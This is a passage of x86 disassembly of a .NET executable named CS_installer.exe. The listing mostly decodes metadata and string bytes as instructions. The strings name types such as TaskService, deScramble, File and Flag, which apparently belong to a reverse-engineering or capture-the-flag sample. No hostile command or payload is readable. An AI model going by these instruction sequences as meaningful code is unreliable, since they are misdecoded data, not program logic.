  402627:	00 60 02             	add    %ah,0x2(%eax)
  40262a:	96                   	xchg   %eax,%esi
  40262b:	02 06                	add    (%esi),%al
  40262d:	00 7d 03             	add    %bh,0x3(%ebp)
  402630:	96                   	xchg   %eax,%esi
  402631:	02 06                	add    (%esi),%al
  402633:	00 f3                	add    %dh,%bl
  402635:	03 96 02 06 00 f9    	add    -0x6fff9fe(%esi),%edx
  40263b:	04 96                	add    $0x96,%al
  40263d:	02 06                	add    (%esi),%al
  40263f:	00 01                	add    %al,(%ecx)
  402641:	00 46 00             	add    %al,0x0(%esi)
  402644:	0a 00                	or     (%eax),%al
  402646:	d4 02                	aam    $0x2
  402648:	b5 03                	mov    $0x3,%ch
  40264a:	0a 00                	or     (%eax),%al
  40264c:	bb 02 b5 03 06       	mov    $0x603b502,%ebx
  402651:	00 d3                	add    %dl,%bl
  402653:	03 9f 04 06 00 71    	add    0x71000604(%edi),%ebx
  402659:	00 96 02 0a 00 63    	add    %dl,0x63000a02(%esi)
  40265f:	03 b5 03 0a 00 e5    	add    -0x1afff5fd(%ebp),%esi
  402665:	02 b5 03 0a 00 9c    	add    -0x63fff5fd(%ebp),%dh
  40266b:	03 b5 03 06 00 9d    	add    -0x62fff9fd(%ebp),%esi
  402671:	02 96 02 0a 00 3c    	add    0x3c000a02(%esi),%dl
  402677:	03 b5 03 0a 00 a0    	add    -0x5ffff5fd(%ebp),%esi
  40267d:	03 b5 03 0a 00 b7    	add    -0x48fff5fd(%ebp),%esi
  402683:	02 b5 03 0a 00 82    	add    -0x7dfff5fd(%ebp),%dh
  402689:	03 b5 03 00 00 00    	add    0x3(%ebp),%esi
  40268f:	00 2a                	add    %ch,(%edx)
  402691:	00 00                	add    %al,(%eax)
  402693:	00 00                	add    %al,(%eax)
  402695:	00 01                	add    %al,(%ecx)
  402697:	00 01                	add    %al,(%ecx)
  402699:	00 00                	add    %al,(%eax)
  40269b:	01 10                	add    %edx,(%eax)
  40269d:	00 a3 00 66 04 35    	add    %ah,0x35046600(%ebx)
  4026a3:	00 01                	add    %al,(%ecx)
  4026a5:	00 01                	add    %al,(%ecx)
  4026a7:	00 00                	add    %al,(%eax)
  4026a9:	01 10                	add    %edx,(%eax)
  4026ab:	00 fc                	add    %bh,%ah
  4026ad:	00 0d 04 35 00 01    	add    %cl,0x1003504
  4026b3:	00 02                	add    %al,(%edx)
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	01 10                	add    %edx,(%eax)
  4026b9:	00 d9                	add    %bl,%cl
  4026bb:	01 0d 04 35 00 02    	add    %ecx,0x2003504
  4026c1:	00 04 00             	add    %al,(%eax,%eax,1)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	10 00                	adc    %al,(%eax)
  4026c8:	85 02                	test   %eax,(%edx)
  4026ca:	ab                   	stos   %eax,%es:(%edi)
  4026cb:	02 41 00             	add    0x0(%ecx),%al
  4026ce:	03 00                	add    (%eax),%eax
  4026d0:	05 00 26 00 53       	add    $0x53002600,%eax
  4026d5:	04 2c                	add    $0x2c,%al
  4026d7:	01 26                	add    %esp,(%esi)
  4026d9:	00 3f                	add    %bh,(%edi)
  4026db:	02 30                	add    (%eax),%dh
  4026dd:	01 50 20             	add    %edx,0x20(%eax)
  4026e0:	00 00                	add    %al,(%eax)
  4026e2:	00 00                	add    %al,(%eax)
  4026e4:	86 18                	xchg   %bl,(%eax)
  4026e6:	ed                   	in     (%dx),%eax
  4026e7:	03 06                	add    (%esi),%eax
  4026e9:	00 01                	add    %al,(%ecx)
  4026eb:	00 58 20             	add    %bl,0x20(%eax)
  4026ee:	00 00                	add    %al,(%eax)
  4026f0:	00 00                	add    %al,(%eax)
  4026f2:	86 18                	xchg   %bl,(%eax)
  4026f4:	ed                   	in     (%dx),%eax
  4026f5:	03 33                	add    (%ebx),%esi
  4026f7:	01 01                	add    %eax,(%ecx)
  4026f9:	00 70 20             	add    %dh,0x20(%eax)
  4026fc:	00 00                	add    %al,(%eax)
  4026fe:	00 00                	add    %al,(%eax)
  402700:	86 18                	xchg   %bl,(%eax)
  402702:	ed                   	in     (%dx),%eax
  402703:	03 38                	add    (%eax),%edi
  402705:	01 01                	add    %eax,(%ecx)
  402707:	00 7f 20             	add    %bh,0x20(%edi)
  40270a:	00 00                	add    %al,(%eax)
  40270c:	00 00                	add    %al,(%eax)
  40270e:	86 18                	xchg   %bl,(%eax)
  402710:	ed                   	in     (%dx),%eax
  402711:	03 33                	add    (%ebx),%esi
  402713:	01 01                	add    %eax,(%ecx)
  402715:	00 00                	add    %al,(%eax)
  402717:	00 00                	add    %al,(%eax)
  402719:	00 80 00 96 20 2e    	add    %al,0x2e209600(%eax)
  40271f:	05 3e 01 01 00       	add    $0x1013e,%eax
  402724:	90                   	nop
  402725:	20 00                	and    %al,(%eax)
  402727:	00 00                	add    %al,(%eax)
  402729:	00 96 00 7d 00 46    	add    %dl,0x46007d00(%esi)
  40272f:	01 05 00 78 23 00    	add    %eax,0x237800
  402735:	00 00                	add    %al,(%eax)
  402737:	00 91 00 a6 02 4a    	add    %dl,0x4a02a600(%ecx)
  40273d:	01 05 00 c4 24 00    	add    %eax,0x24c400
  402743:	00 00                	add    %al,(%eax)
  402745:	00 86 18 ed 03 06    	add    %al,0x603ed18(%esi)
  40274b:	00 06                	add    %al,(%esi)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	00 01                	add    %al,(%ecx)
  402751:	00 70 02             	add    %dh,0x2(%eax)
  402754:	00 00                	add    %al,(%eax)
  402756:	02 00                	add    (%eax),%al
  402758:	9b                   	fwait
  402759:	02 00                	add    (%eax),%al
  40275b:	00 03                	add    %al,(%ebx)
  40275d:	00 5f 00             	add    %bl,0x0(%edi)
  402760:	00 00                	add    %al,(%eax)
  402762:	04 00                	add    $0x0,%al
  402764:	96                   	xchg   %eax,%esi
  402765:	00 00                	add    %al,(%eax)
  402767:	00 01                	add    %al,(%ecx)
  402769:	00 61 04             	add    %ah,0x4(%ecx)
  40276c:	09 00                	or     %eax,(%eax)
  40276e:	ed                   	in     (%dx),%eax
  40276f:	03 01                	add    (%ecx),%eax
  402771:	00 11                	add    %dl,(%ecx)
  402773:	00 ed                	add    %ch,%ch
  402775:	03 06                	add    (%esi),%eax
  402777:	00 19                	add    %bl,(%ecx)
  402779:	00 ed                	add    %ch,%ch
  40277b:	03 0a                	add    (%edx),%ecx
  40277d:	00 29                	add    %ch,(%ecx)
  40277f:	00 ed                	add    %ch,%ch
  402781:	03 10                	add    (%eax),%edx
  402783:	00 31                	add    %dh,(%ecx)
  402785:	00 ed                	add    %ch,%ch
  402787:	03 10                	add    (%eax),%edx
  402789:	00 39                	add    %bh,(%ecx)
  40278b:	00 ed                	add    %ch,%ch
  40278d:	03 10                	add    (%eax),%edx
  40278f:	00 41 00             	add    %al,0x0(%ecx)
  402792:	ed                   	in     (%dx),%eax
  402793:	03 10                	add    (%eax),%edx
  402795:	00 49 00             	add    %cl,0x0(%ecx)
  402798:	ed                   	in     (%dx),%eax
  402799:	03 10                	add    (%eax),%edx
  40279b:	00 51 00             	add    %dl,0x0(%ecx)
  40279e:	ed                   	in     (%dx),%eax
  40279f:	03 10                	add    (%eax),%edx
  4027a1:	00 59 00             	add    %bl,0x0(%ecx)
  4027a4:	ed                   	in     (%dx),%eax
  4027a5:	03 10                	add    (%eax),%edx
  4027a7:	00 61 00             	add    %ah,0x0(%ecx)
  4027aa:	ed                   	in     (%dx),%eax
  4027ab:	03 06                	add    (%esi),%eax
  4027ad:	00 79 00             	add    %bh,0x0(%ecx)
  4027b0:	ed                   	in     (%dx),%eax
  4027b1:	03 15 00 69 00 ed    	add    0xed006900,%edx
  4027b7:	03 06                	add    (%esi),%eax
  4027b9:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4027bc:	ed                   	in     (%dx),%eax
  4027bd:	03 06                	add    (%esi),%eax
  4027bf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4027c2:	61                   	popa
  4027c3:	00 30                	add    %dh,(%eax)
  4027c5:	00 c1                	add    %al,%cl
  4027c7:	00 1a                	add    %bl,(%edx)
  4027c9:	05 38 00 c9 00       	add    $0xc90038,%eax
  4027ce:	b2 04                	mov    $0x4,%dl
  4027d0:	3d 00 0c 00 39       	cmp    $0x39000c00,%eax
  4027d5:	05 42 00 0c 00       	add    $0xc0042,%eax
  4027da:	8d 02                	lea    (%edx),%eax
  4027dc:	48                   	dec    %eax
  4027dd:	00 d1                	add    %dl,%cl
  4027df:	00 5e 02             	add    %bl,0x2(%esi)
  4027e2:	4f                   	dec    %edi
  4027e3:	00 c9                	add    %cl,%cl
  4027e5:	00 da                	add    %bl,%dl
  4027e7:	04 53                	add    $0x53,%al
  4027e9:	00 c9                	add    %cl,%cl
  4027eb:	00 67 02             	add    %ah,0x2(%edi)
  4027ee:	59                   	pop    %ecx
  4027ef:	00 d9                	add    %bl,%cl
  4027f1:	00 e8                	add    %ch,%al
  4027f3:	04 6e                	add    $0x6e,%al
  4027f5:	00 e1                	add    %ah,%cl
  4027f7:	00 f4                	add    %dh,%ah
  4027f9:	04 73                	add    $0x73,%al
  4027fb:	00 91 00 ed 03 06    	add    %dl,0x603ed00(%ecx)
  402801:	00 91 00 7d 04 78    	add    %dl,0x78047d00(%ecx)
  402807:	00 14 00             	add    %dl,(%eax,%eax,1)
  40280a:	df 03                	filds  (%ebx)
  40280c:	88 00                	mov    %al,(%eax)
  40280e:	1c 00                	sbb    $0x0,%al
  402810:	05 05 98 00 a9       	add    $0xa9009805,%eax
  402815:	00 f7                	add    %dh,%bh
  402817:	02 9d 00 99 00 93    	add    -0x6cff6700(%ebp),%bl
  40281d:	04 a2                	add    $0xa2,%al
  40281f:	00 f1                	add    %dh,%cl
  402821:	00 8d 02 a7 00 81    	add    %cl,-0x7eff58fe(%ebp)
  402827:	00 5e 02             	add    %bl,0x2(%esi)
  40282a:	4f                   	dec    %edi
  40282b:	00 c9                	add    %cl,%cl
  40282d:	00 8a 04 ad 00 01    	add    %cl,0x100ad04(%edx)
  402833:	01 11                	add    %edx,(%ecx)
  402835:	05 b2 00 09 01       	add    $0x10900b2,%eax
  40283a:	9b                   	fwait
  40283b:	00 06                	add    %al,(%esi)
  40283d:	00 91 00 72 02 9d    	add    %dl,-0x62fd8e00(%ecx)
  402843:	00 99 00 4e 03 b6    	add    %bl,-0x49fcb200(%ecx)
  402849:	00 11                	add    %dl,(%ecx)
  40284b:	01 2c 03             	add    %ebp,(%ebx,%eax,1)
  40284e:	10 00                	adc    %al,(%eax)
  402850:	99                   	cltd
  402851:	00 bc 04 bc 00 b1 00 	add    %bh,0xb100bc(%esp,%eax,1)
  402858:	26 05 c2 00 b1 00    	es add $0xb100c2,%eax
  40285e:	3c 04                	cmp    $0x4,%al
  402860:	c7 00 21 01 ed 03    	movl   $0x3ed0121,(%eax)
  402866:	cd 00                	int    $0x0
  402868:	29 01                	sub    %eax,(%ecx)
  40286a:	47                   	inc    %edi
  40286b:	04 d3                	add    $0xd3,%al
  40286d:	00 29                	add    %ch,(%ecx)
  40286f:	01 78 03             	add    %edi,0x3(%eax)
  402872:	da 00                	fiaddl (%eax)
  402874:	31 01                	xor    %eax,(%ecx)
  402876:	ed                   	in     (%dx),%eax
  402877:	03 df                	add    %edi,%ebx
  402879:	00 39                	add    %bh,(%ecx)
  40287b:	01 1d 03 ea 00 19    	add    %ebx,0x1900ea03
  402881:	01 61 00             	add    %esp,0x0(%ecx)
  402884:	f1                   	int1
  402885:	00 41 01             	add    %al,0x1(%ecx)
  402888:	ed                   	in     (%dx),%eax
  402889:	03 ff                	add    %edi,%edi
  40288b:	00 f1                	add    %dh,%cl
  40288d:	00 61 00             	add    %ah,0x0(%ecx)
  402890:	f1                   	int1
  402891:	00 91 00 8d 03 0c    	add    %dl,0xc038d00(%ecx)
  402897:	01 49 01             	add    %ecx,0x1(%ecx)
  40289a:	06                   	push   %es
  40289b:	03 12                	add    (%edx),%edx
  40289d:	01 81 00 ed 03 06    	add    %eax,0x603ed00(%ecx)
  4028a3:	00 2e                	add    %ch,(%esi)
  4028a5:	00 0b                	add    %cl,(%ebx)
  4028a7:	00 50 01             	add    %dl,0x1(%eax)
  4028aa:	2e 00 13             	add    %dl,%cs:(%ebx)
  4028ad:	00 59 01             	add    %bl,0x1(%ecx)
  4028b0:	2e 00 1b             	add    %bl,%cs:(%ebx)
  4028b3:	00 78 01             	add    %bh,0x1(%eax)
  4028b6:	2e 00 23             	add    %ah,%cs:(%ebx)
  4028b9:	00 81 01 2e 00 2b    	add    %al,0x2b002e01(%ecx)
  4028bf:	00 cb                	add    %cl,%bl
  4028c1:	01 2e                	add    %ebp,(%esi)
  4028c3:	00 33                	add    %dh,(%ebx)
  4028c5:	00 dd                	add    %bl,%ch
  4028c7:	01 2e                	add    %ebp,(%esi)
  4028c9:	00 3b                	add    %bh,(%ebx)
  4028cb:	00 ea                	add    %ch,%dl
  4028cd:	01 2e                	add    %ebp,(%esi)
  4028cf:	00 43 00             	add    %al,0x0(%ebx)
  4028d2:	f7 01 2e 00 4b 00    	testl  $0x4b002e,(%ecx)
  4028d8:	cb                   	lret
  4028d9:	01 2e                	add    %ebp,(%esi)
  4028db:	00 53 00             	add    %dl,0x0(%ebx)
  4028de:	cb                   	lret
  4028df:	01 43 00             	add    %eax,0x0(%ebx)
  4028e2:	5b                   	pop    %ebx
  4028e3:	00 02                	add    %al,(%edx)
  4028e5:	02 43 00             	add    0x0(%ebx),%al
  4028e8:	0a 00                	or     (%eax),%al
  4028ea:	02 02                	add    (%edx),%al
  4028ec:	63 00                	arpl   %eax,(%eax)
  4028ee:	5b                   	pop    %ebx
  4028ef:	00 02                	add    %al,(%edx)
  4028f1:	02 63 00             	add    0x0(%ebx),%ah
  4028f4:	0a 00                	or     (%eax),%al
  4028f6:	02 02                	add    (%edx),%al
  4028f8:	63 00                	arpl   %eax,(%eax)
  4028fa:	63 00                	arpl   %eax,(%eax)
  4028fc:	07                   	pop    %es
  4028fd:	02 83 00 5b 00 02    	add    0x2005b00(%ebx),%al
  402903:	02 83 00 0a 00 02    	add    0x2000a00(%ebx),%al
  402909:	02 83 00 63 00 2e    	add    0x2e006300(%ebx),%al
  40290f:	02 a3 00 22 00 55    	add    0x55002200(%ebx),%ah
  402915:	02 a3 00 12 00 5b    	add    0x5b001200(%ebx),%ah
  40291b:	02 1b                	add    (%ebx),%bl
  40291d:	00 5d 00             	add    %bl,0x0(%ebp)
  402920:	7a 02                	jp     0x402924
  402922:	29 00                	sub    %eax,(%eax)
  402924:	81 00 91 00 04 01    	addl   $0x1040091,(%eax)
  40292a:	0b 00                	or     (%eax),%eax
  40292c:	2e 05 01 00 04 80    	cs add $0x80040001,%eax
  402932:	00 00                	add    %al,(%eax)
  402934:	01 00                	add    %eax,(%eax)
	...
  402942:	a8 03                	test   $0x3,%al
  402944:	00 00                	add    %al,(%eax)
  402946:	04 00                	add    $0x0,%al
	...
  402950:	00 00                	add    %al,(%eax)
  402952:	1a 01                	sbb    (%ecx),%al
  402954:	3d 00 00 00 00       	cmp    $0x0,%eax
  402959:	00 02                	add    %al,(%edx)
  40295b:	00 09                	add    %cl,(%ecx)
  40295d:	00 03                	add    %al,(%ebx)
  40295f:	00 00                	add    %al,(%eax)
  402961:	00 00                	add    %al,(%eax)
  402963:	00 00                	add    %al,(%eax)
  402965:	00 23                	add    %ah,(%ebx)
  402967:	01 b5 03 00 00 00    	add    %esi,0x3(%ebp)
  40296d:	00 5f 00             	add    %bl,0x0(%edi)
  402970:	f9                   	stc
  402971:	00 63 00             	add    %ah,0x0(%ebx)
  402974:	06                   	push   %es
  402975:	01 00                	add    %eax,(%eax)
  402977:	00 00                	add    %al,(%eax)
  402979:	49                   	dec    %ecx
  40297a:	45                   	inc    %ebp
  40297b:	6e                   	outsb  %ds:(%esi),(%dx)
  40297c:	75 6d                	jne    0x4029eb
  40297e:	65 72 61             	gs jb  0x4029e2
  402981:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  402985:	31 00                	xor    %eax,(%eax)
  402987:	49                   	dec    %ecx
  402988:	45                   	inc    %ebp
  402989:	6e                   	outsb  %ds:(%esi),(%dx)
  40298a:	75 6d                	jne    0x4029f9
  40298c:	65 72 61             	gs jb  0x4029f0
  40298f:	74 6f                	je     0x402a00
  402991:	72 60                	jb     0x4029f3
  402993:	31 00                	xor    %eax,(%eax)
  402995:	44                   	inc    %esp
  402996:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  40299d:	72 79                	jb     0x402a18
  40299f:	60                   	pusha
  4029a0:	32 00                	xor    (%eax),%al
  4029a2:	3c 4d                	cmp    $0x4d,%al
  4029a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4029a5:	64 75 6c             	fs jne 0x402a14
  4029a8:	65 3e 00 53 79       	gs add %dl,%ds:0x79(%ebx)
  4029ad:	73 74                	jae    0x402a23
  4029af:	65 6d                	gs insl (%dx),%es:(%edi)
  4029b1:	2e 49                	cs dec %ecx
  4029b3:	4f                   	dec    %edi
  4029b4:	00 6d 73             	add    %ch,0x73(%ebp)
  4029b7:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4029ba:	6c                   	insb   (%dx),%es:(%edi)
  4029bb:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4029c2:	65 6d                	gs insl (%dx),%es:(%edi)
  4029c4:	2e 43                	cs inc %ebx
  4029c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c7:	6c                   	insb   (%dx),%es:(%edi)
  4029c8:	6c                   	insb   (%dx),%es:(%edi)
  4029c9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4029ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4029cf:	73 2e                	jae    0x4029ff
  4029d1:	47                   	inc    %edi
  4029d2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4029d4:	65 72 69             	gs jb  0x402a40
  4029d7:	63 00                	arpl   %eax,(%eax)
  4029d9:	41                   	inc    %ecx
  4029da:	64 64 00 54 61 73    	fs add %dl,%fs:0x73(%ecx,%eiz,2)
  4029e0:	6b 53 65 72          	imul   $0x72,0x65(%ebx),%edx
  4029e4:	76 69                	jbe    0x402a4f
  4029e6:	63 65 00             	arpl   %esp,0x0(%ebp)
  4029e9:	49                   	dec    %ecx
  4029ea:	44                   	inc    %esp
  4029eb:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4029f2:	6c                   	insb   (%dx),%es:(%edi)
  4029f3:	65 00 64 65 53       	add    %ah,%gs:0x53(%ebp,%eiz,2)
  4029f8:	63 72 61             	arpl   %esi,0x61(%edx)
  4029fb:	6d                   	insl   (%dx),%es:(%edi)
  4029fc:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  402a00:	46                   	inc    %esi
  402a01:	69 6c 65 00 44 61 74 	imul   $0x65746144,0x0(%ebp,%eiz,2),%ebp
  402a08:	65 
  402a09:	54                   	push   %esp
  402a0a:	69 6d 65 00 74 79 70 	imul   $0x70797400,0x65(%ebp),%ebp
  402a11:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  402a16:	70 6f                	jo     0x402a87
  402a18:	73 65                	jae    0x402a7f
  402a1a:	00 45 6d             	add    %al,0x6d(%ebp)
  402a1d:	62 65 64             	bound  %esp,0x64(%ebp)
  402a20:	64 65 64 41          	fs gs fs inc %ecx
  402a24:	74 74                	je     0x402a9a
  402a26:	72 69                	jb     0x402a91
  402a28:	62 75 74             	bound  %esi,0x74(%ebp)
  402a2b:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402a2f:	6d                   	insl   (%dx),%es:(%edi)
  402a30:	70 69                	jo     0x402a9b
  402a32:	6c                   	insb   (%dx),%es:(%edi)
  402a33:	65 72 47             	gs jb  0x402a7d
  402a36:	65 6e                	outsb  %gs:(%esi),(%dx)
  402a38:	65 72 61             	gs jb  0x402a9c
  402a3b:	74 65                	je     0x402aa2
  402a3d:	64 41                	fs inc %ecx
  402a3f:	74 74                	je     0x402ab5
  402a41:	72 69                	jb     0x402aac
  402a43:	62 75 74             	bound  %esi,0x74(%ebp)
  402a46:	65 00 41 74          	add    %al,%gs:0x74(%ecx)
  402a4a:	74 72                	je     0x402abe
  402a4c:	69 62 75 74 65 55 73 	imul   $0x73556574,0x75(%edx),%esp
  402a53:	61                   	popa
  402a54:	67 65 41             	addr16 gs inc %ecx
  402a57:	74 74                	je     0x402acd
  402a59:	72 69                	jb     0x402ac4
  402a5b:	62 75 74             	bound  %esi,0x74(%ebp)
  402a5e:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402a63:	75 67                	jne    0x402acc
  402a65:	67 61                	addr16 popa
  402a67:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402a6b:	74 74                	je     0x402ae1
  402a6d:	72 69                	jb     0x402ad8
  402a6f:	62 75 74             	bound  %esi,0x74(%ebp)
  402a72:	65 00 4e 75          	add    %cl,%gs:0x75(%esi)
  402a76:	6c                   	insb   (%dx),%es:(%edi)
  402a77:	6c                   	insb   (%dx),%es:(%edi)
  402a78:	61                   	popa
  402a79:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402a7d:	74 74                	je     0x402af3
  402a7f:	72 69                	jb     0x402aea
  402a81:	62 75 74             	bound  %esi,0x74(%ebp)
  402a84:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402a88:	73 65                	jae    0x402aef
  402a8a:	6d                   	insl   (%dx),%es:(%edi)
  402a8b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402a8f:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  402a96:	72 
  402a97:	69 62 75 74 65 00 54 	imul   $0x54006574,0x75(%edx),%esp
  402a9e:	61                   	popa
  402a9f:	72 67                	jb     0x402b08
  402aa1:	65 74 46             	gs je  0x402aea
  402aa4:	72 61                	jb     0x402b07
  402aa6:	6d                   	insl   (%dx),%es:(%edi)
  402aa7:	65 77 6f             	gs ja  0x402b19
  402aaa:	72 6b                	jb     0x402b17
  402aac:	41                   	inc    %ecx
  402aad:	74 74                	je     0x402b23
  402aaf:	72 69                	jb     0x402b1a
  402ab1:	62 75 74             	bound  %esi,0x74(%ebp)
  402ab4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ab8:	73 65                	jae    0x402b1f
  402aba:	6d                   	insl   (%dx),%es:(%edi)
  402abb:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402abf:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402ac6:	69 
  402ac7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ac8:	6e                   	outsb  %ds:(%esi),(%dx)
  402ac9:	41                   	inc    %ecx
  402aca:	74 74                	je     0x402b40
  402acc:	72 69                	jb     0x402b37
  402ace:	62 75 74             	bound  %esi,0x74(%ebp)
  402ad1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ad5:	73 65                	jae    0x402b3c
  402ad7:	6d                   	insl   (%dx),%es:(%edi)
  402ad8:	62 6c 79 49          	bound  %ebp,0x49(%ecx,%edi,2)
  402adc:	6e                   	outsb  %ds:(%esi),(%dx)
  402add:	66 6f                	outsw  %ds:(%esi),(%dx)
  402adf:	72 6d                	jb     0x402b4e
  402ae1:	61                   	popa
  402ae2:	74 69                	je     0x402b4d
  402ae4:	6f                   	outsl  %ds:(%esi),(%dx)
  402ae5:	6e                   	outsb  %ds:(%esi),(%dx)
  402ae6:	61                   	popa
  402ae7:	6c                   	insb   (%dx),%es:(%edi)
  402ae8:	56                   	push   %esi
  402ae9:	65 72 73             	gs jb  0x402b5f
  402aec:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402af3:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402afa:	73 73                	jae    0x402b6f
  402afc:	65 6d                	gs insl (%dx),%es:(%edi)
  402afe:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402b02:	6f                   	outsl  %ds:(%esi),(%dx)
  402b03:	6e                   	outsb  %ds:(%esi),(%dx)
  402b04:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402b0a:	74 69                	je     0x402b75
  402b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  402b0d:	6e                   	outsb  %ds:(%esi),(%dx)
  402b0e:	41                   	inc    %ecx
  402b0f:	74 74                	je     0x402b85
  402b11:	72 69                	jb     0x402b7c
  402b13:	62 75 74             	bound  %esi,0x74(%ebp)
  402b16:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402b1a:	6d                   	insl   (%dx),%es:(%edi)
  402b1b:	70 69                	jo     0x402b86
  402b1d:	6c                   	insb   (%dx),%es:(%edi)
  402b1e:	61                   	popa
  402b1f:	74 69                	je     0x402b8a
  402b21:	6f                   	outsl  %ds:(%esi),(%dx)
  402b22:	6e                   	outsb  %ds:(%esi),(%dx)
  402b23:	52                   	push   %edx
  402b24:	65 6c                	gs insb (%dx),%es:(%edi)
  402b26:	61                   	popa
  402b27:	78 61                	js     0x402b8a
  402b29:	74 69                	je     0x402b94
  402b2b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b2c:	6e                   	outsb  %ds:(%esi),(%dx)
  402b2d:	73 41                	jae    0x402b70
  402b2f:	74 74                	je     0x402ba5
  402b31:	72 69                	jb     0x402b9c
  402b33:	62 75 74             	bound  %esi,0x74(%ebp)
  402b36:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402b3a:	73 65                	jae    0x402ba1
  402b3c:	6d                   	insl   (%dx),%es:(%edi)
  402b3d:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402b41:	72 6f                	jb     0x402bb2
  402b43:	64 75 63             	fs jne 0x402ba9
  402b46:	74 41                	je     0x402b89
  402b48:	74 74                	je     0x402bbe
  402b4a:	72 69                	jb     0x402bb5
  402b4c:	62 75 74             	bound  %esi,0x74(%ebp)
  402b4f:	65 00 4e 75          	add    %cl,%gs:0x75(%esi)
  402b53:	6c                   	insb   (%dx),%es:(%edi)
  402b54:	6c                   	insb   (%dx),%es:(%edi)
  402b55:	61                   	popa
  402b56:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  402b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402b5b:	6e                   	outsb  %ds:(%esi),(%dx)
  402b5c:	74 65                	je     0x402bc3
  402b5e:	78 74                	js     0x402bd4
  402b60:	41                   	inc    %ecx
  402b61:	74 74                	je     0x402bd7
  402b63:	72 69                	jb     0x402bce
  402b65:	62 75 74             	bound  %esi,0x74(%ebp)
  402b68:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402b6c:	73 65                	jae    0x402bd3
  402b6e:	6d                   	insl   (%dx),%es:(%edi)
  402b6f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402b73:	6f                   	outsl  %ds:(%esi),(%dx)
  402b74:	6d                   	insl   (%dx),%es:(%edi)
  402b75:	70 61                	jo     0x402bd8
  402b77:	6e                   	outsb  %ds:(%esi),(%dx)
  402b78:	79 41                	jns    0x402bbb
  402b7a:	74 74                	je     0x402bf0
  402b7c:	72 69                	jb     0x402be7
  402b7e:	62 75 74             	bound  %esi,0x74(%ebp)
  402b81:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402b85:	6e                   	outsb  %ds:(%esi),(%dx)
  402b86:	74 69                	je     0x402bf1
  402b88:	6d                   	insl   (%dx),%es:(%edi)
  402b89:	65 43                	gs inc %ebx
  402b8b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b8c:	6d                   	insl   (%dx),%es:(%edi)
  402b8d:	70 61                	jo     0x402bf0
  402b8f:	74 69                	je     0x402bfa
  402b91:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402b94:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402b9b:	69 
  402b9c:	62 75 74             	bound  %esi,0x74(%ebp)
  402b9f:	65 00 42 79          	add    %al,%gs:0x79(%edx)
  402ba3:	74 65                	je     0x402c0a
  402ba5:	00 43 53             	add    %al,0x53(%ebx)
  402ba8:	5f                   	pop    %edi
  402ba9:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  402bb0:	65 72 2e             	gs jb  0x402be1
  402bb3:	65 78 65             	gs js  0x402c1b
  402bb6:	00 46 6c             	add    %al,0x6c(%esi)
  402bb9:	61                   	popa
  402bba:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  402bbe:	73 74                	jae    0x402c34
  402bc0:	65 6d                	gs insl (%dx),%es:(%edi)
  402bc2:	2e 52                	cs push %edx
  402bc4:	75 6e                	jne    0x402c34
  402bc6:	74 69                	je     0x402c31
  402bc8:	6d                   	insl   (%dx),%es:(%edi)
  402bc9:	65 2e 56             	gs cs push %esi
  402bcc:	65 72 73             	gs jb  0x402c42
  402bcf:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402bd6:	54                   	push   %esp
  402bd7:	6f                   	outsl  %ds:(%esi),(%dx)
  402bd8:	53                   	push   %ebx
  402bd9:	74 72                	je     0x402c4d
  402bdb:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  402be2:	5f                   	pop    %edi
  402be3:	4c                   	dec    %esp
  402be4:	65 6e                	outsb  %gs:(%esi),(%dx)
  402be6:	67 74 68             	addr16 je 0x402c51
